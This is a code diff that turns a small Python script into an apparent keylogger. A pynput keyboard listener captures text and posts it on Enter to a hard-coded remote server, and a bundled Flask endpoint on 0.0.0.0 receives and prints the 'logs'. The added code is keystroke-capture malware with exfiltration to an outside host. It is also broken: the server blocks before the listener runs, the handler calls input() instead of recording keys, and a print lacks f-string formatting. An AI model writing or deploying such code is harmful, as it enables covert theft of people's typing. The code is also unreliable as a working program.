@@ -1,12 +1,35 @@
 from pynput.keyboard import Listener, Key
-logs = ''
+import requests
+from flask import Flask, request
 
-for i in range(10):
+app = Flask(__name__)
 
-    a = input()
+@app.route('/get_logs', methods=['POST'])
 
-    if a in 'Key':
-        a = ' '+a+' '
-    logs += a
+def get_logs():
+    logs = request.form['logs']
 
-print(logs)
+    print('받은 메시지 :{logs}\n')
+
+    return {'result': True}
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+
+server_url = 'http://10.104.104.208:5000/get_logs'
+msg = ''
+
+def on_press(key):
+    global msg
+    
+    msg = input('보낼 메시지 :')
+    if key == Key.enter:
+        try:
+            requests.post(server_url, data={'logs': msg})
+        except:
+            print('Server error!')
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
